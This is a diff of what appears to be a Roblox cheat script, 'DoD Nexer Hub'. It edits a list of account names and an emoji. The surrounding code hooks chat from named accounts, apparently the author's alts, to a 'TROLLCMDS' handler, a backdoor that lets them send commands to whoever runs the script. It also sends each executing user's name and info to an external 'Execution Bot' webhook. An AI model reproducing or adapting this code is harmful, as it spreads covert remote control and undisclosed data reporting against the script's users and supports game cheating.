@@ -2678,12 +2678,12 @@ end)
 end
 
 for i,v in pairs(game:GetService("Players"):GetPlayers()) do
-if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" or v.Name == "Mia_Z3ro2002" then
+if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" then
 v.Chatted:Connect(onChattedTROLLCMDS)
 end
 end
 game:GetService("Players").PlayerAdded:Connect(function(v)
-if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" or v.Name == "Mia_Z3ro2002" then
+if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" then
 v.Chatted:Connect(onChattedTROLLCMDS)
 end
 end)
@@ -2735,7 +2735,7 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub 🎁",
+    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub 🎈",
     ["embeds"] = {
        {
            ["title"] = "General Info",
@@ -2863,7 +2863,7 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub 🎁",
+    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub 🎈",
     ["embeds"] = {
        {
            ["title"] = "General Info",
